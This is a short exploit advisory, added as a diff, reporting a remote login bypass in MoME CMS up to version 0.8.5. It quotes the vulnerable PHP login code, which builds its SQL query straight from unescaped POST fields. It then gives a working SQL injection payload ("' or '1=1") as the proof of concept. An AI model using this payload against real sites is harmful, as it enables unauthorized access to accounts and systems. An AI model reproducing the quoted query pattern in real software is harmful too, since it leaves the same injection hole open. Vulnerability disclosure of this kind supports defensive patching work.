@@ -1,0 +1,26 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   |    MoME CMS <= 0.8.5 Remote Login Bypass Exploit   |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Download: http://sourceforge.net/projects/mome/files/
+[!] Date: 16.01.2010
+[!] Remote: yes
+
+
+[!] Code :
+
+
+//controllo user e passwd da login
+ if(isset($_POST['posted_username']) && isset($_POST['posted_password'])) {
+        $query="SELECT * FROM users WHERE username='$_POST[posted_username]' AND
+password=md5('$_POST[posted_password]')";
+
+
+[!] PoC:
+
+    username : ' or '1=1
+    password : cr4wl3r
